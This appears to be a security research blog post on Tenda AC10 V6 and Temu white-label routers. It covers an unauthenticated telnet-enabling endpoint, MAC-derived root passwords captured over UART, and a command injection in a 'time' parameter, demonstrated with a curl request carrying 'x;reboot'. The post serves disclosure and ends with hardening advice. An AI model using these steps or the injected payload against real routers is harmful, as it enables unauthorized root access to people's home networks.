+++
title = "Tenda, Temu, and the Root Password Printed on the Serial Console"
date = "2026-08-03"
+++

A recent security review of the Tenda AC10 V6 highlights common hardware security oversights in consumer routers: an unauthenticated endpoint enables a Telnet daemon, and the dynamically generated root password is printed directly to the serial console during factory resets.

## Enabling Telnet without authentication

On this generation of Tenda hardware, requesting `http://<router>/goform/telnet` enables the Telnet service without any authentication check. Sending a simple GET or POST to that URL flips the service from closed to listening on port 23.

The challenge was determining the root password. In earlier generations, the password hash resided in the shadow file within an unencrypted firmware image. Starting with the AC10 V6, Tenda encrypted the firmware updates.

## Password generation logic

In earlier models like the AC8, the password generation algorithm was reverse-engineered from firmware strings:

```text
MAC:            xx:xx:xx:xx:NC:00        # read via `arp -a`
magic string:   NC00                     # generation-specific constant
build:          base64( magic[0:2] + mac[-2] + mac[-1] )
                -> root password
```

On the AC10 V6, the magic string changed, and the encrypted firmware prevented extracting it directly from vendor images.

## Capturing credentials over UART

During reboot or factory reset, the router's system-on-chip outputs kernel and boot messages over UART pads exposed on the PCB. 

Connecting a USB-to-UART serial adapter and holding the factory reset button captures the re-provisioning log. During this routine, the firmware prints the pre-encoded password components followed by the base64-encoded root password directly to the serial output. Logging in via Telnet with that password yields a root BusyBox shell.

```bash
# workflow summary:
curl http://192.168.0.1/goform/telnet     # start telnet service
arp -a                                     # capture MAC address
# monitor serial console during factory reset:
# logs display cleartext and base64-encoded password
telnet 192.168.0.1
# authenticate as root with recovered password
```

From root access, researchers recovered the `decrypt_firmware` binary, yielding the AES keys needed to decrypt the entire firmware line.

## Analyzing white-label routers

A similar exercise on a low-cost white-label router ordered via Temu illustrates standard embedded firmware reverse-engineering steps:

```bash
# 1. extract firmware from backup function in the web interface
curl http://192.168.1.1/... -o full.bin
binwalk -e full.bin          # unpack squashfs filesystem

# 2. trace web request handlers
grep -r "protocol.csp" squashfs-root/   # web server routing
grep -r "wizard_config" squashfs-root/  # locate binary handler

# 3. inspect binary in Ghidra to locate dispatch table
# 4. locate command injection sink:
#    get_param(request, "time") -> sprintf(time_buf, "date %s", t) -> system(time_buf)

# 5. verify execution:
curl 'http://192.168.1.1/protocol.csp?fname=net&option=time_config&time=x;reboot&fnc=set&<token>'
```

The web server passed parameters from the `time` parameter directly into `sprintf` and `system()` without input sanitization. Once command execution was confirmed, planting a script in `/tmp/` and spawning a bind shell provided full administrative control.

## Firmware security realities

Deriving default credentials from device metadata (like MAC addresses) and pre-shared constants provides little protection when the generation algorithm is embedded in the hardware itself. If physical debug pads remain active in production, serial console output will quickly reveal hardcoded logic. Hardening embedded devices requires disabling manufacturing debug consoles on production boards and requiring unique, random passwords generated at initial setup.
